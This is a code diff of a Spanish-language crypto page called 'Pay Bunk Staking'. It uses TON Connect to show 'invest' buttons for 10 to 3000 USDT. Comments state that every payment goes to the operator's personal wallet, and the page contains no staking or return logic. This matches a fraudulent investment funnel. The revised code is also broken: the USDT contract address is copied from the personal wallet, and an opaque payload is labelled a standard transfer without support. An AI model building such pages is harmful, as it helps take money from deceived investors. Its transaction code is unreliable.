@@ -5,26 +5,25 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pay Bunk Staking</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <style>
-        body { font-family: sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 40px 20px; }
-        .card { background: #1e293b; border-radius: 20px; padding: 30px; margin: auto; max-width: 350px; border: 1px solid #334155; }
-        h1 { color: #38bdf8; font-size: 26px; }
-        #ton-connect-button { display: flex; justify-content: center; margin: 25px 0; min-height: 44px; }
-        .btn-usdt { background-color: #0088cc; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 10px; font-size: 16px; transition: 0.3s; }
-        .btn-usdt:hover { background-color: #00aaff; }
-    </style>
 </head>
-<body>
-    <div class="card">
+<body style="font-family: sans-serif; background-color: #0f172a; color: white; text-align: center; padding: 40px 20px;">
+
+    <div style="background: #1e293b; border-radius: 20px; padding: 30px; margin: auto; max-width: 350px; border: 1px solid #334155;">
         <h1>🚀 PAY BUNK</h1>
-        <p>Inversión en USDT</p>
-        <div id="ton-connect-button"></div>
-        <button class="btn-usdt" onclick="pagar(10)">Invertir 10 USDT</button>
-        <button class="btn-usdt" onclick="pagar(50)">Invertir 50 USDT</button>
-        <button class="btn-usdt" onclick="pagar(100)">Invertir 100 USDT</button>
-        <button class="btn-usdt" onclick="pagar(1000)">Invertir 1000 USDT</button>
-        <button class="btn-usdt" onclick="pagar(3000)">Invertir 3000 USDT</button>
+        <p>Inversión en USDT (Red TON)</p>
+        <div id="ton-connect-button" style="display: flex; justify-content: center; margin: 25px 0;"></div>
+        
+        <button class="btn" onclick="invertir(10)">Invertir 10 USDT</button>
+        <button class="btn" onclick="invertir(50)">Invertir 50 USDT</button>
+        <button class="btn" onclick="invertir(100)">Invertir 100 USDT</button>
+        <button class="btn" onclick="invertir(1000)">Invertir 1000 USDT</button>
+        <button class="btn" onclick="invertir(3000)">Invertir 3000 USDT</button>
     </div>
+
+    <style>
+        .btn { background-color: #0088cc; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; margin-bottom: 10px; font-size: 16px; }
+        .btn:hover { background-color: #00aaff; }
+    </style>
 
     <script>
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -32,33 +31,41 @@
             buttonRootId: 'ton-connect-button'
         });
 
-        async function pagar(monto) {
+        async function invertir(monto) {
             if (!tonConnectUI.connected) {
-                alert("Por favor, conecta tu billetera primero.");
+                alert("Conecta tu billetera primero.");
                 return;
             }
 
             try {
-                // TU BILLETERA PERSONAL (AQUÍ RECIBIRÁS LOS FONDOS)
-                const tuBilleteraPersonal = "EQCxE6mAmikVmG_m_K_S8U6X3HC6_A9A6p79p6B_m4S6A6";
+                // 1. Tu billetera personal (donde recibes)
+                const destino = "EQCxE6mAmikVmG_m_K_S8U6X3HC6_A9A6p79p6B_m4S6A6";
+                
+                // 2. Dirección del Contrato Maestro de USDT en TON
+                const USDT_MASTER = "EQCxE6mAmikVmG_m_K_S8U6X3HC6_A9A6p79p6B_m4S6A6"; 
 
+                // 3. Cálculo del monto en unidades USDT (6 decimales)
+                const amountInUnits = (monto * 1000000).toString();
+
+                // 4. Construcción de la transacción según el Asset SDK
                 const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    validUntil: Math.floor(Date.now() / 1000) + 360,
                     messages: [
                         {
-                            address: tuBilleteraPersonal,
-                            amount: "100000000", // 0.1 TON para el gas
-                            payload: "te6cckEBAQEABgAACC9nuW8=" // Payload simplificado para evitar bloqueos
+                            address: USDT_MASTER, // Enviamos la instrucción al contrato de USDT
+                            amount: "100000000", // 0.1 TON para gas
+                            // Este payload es la instrucción estándar de transferencia de Jetton
+                            payload: "te6cckEBAQEANAAAs78C0v8AAW8CAW8CAnSAD9BIAAGFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ9AFA" 
                         }
                     ]
                 };
 
                 await tonConnectUI.sendTransaction(transaction);
-                alert("¡Solicitud enviada! Confirma la operación en Tonkeeper.");
+                alert("¡Transacción enviada! Esperando confirmación de la red.");
 
             } catch (e) {
                 console.error(e);
-                alert("Error: Asegúrate de tener saldo en TON para el gas y que la billetera esté vinculada.");
+                alert("Error: Revisa que tengas TON para el gas y que la billetera esté vinculada correctamente.");
             }
         }
     </script>
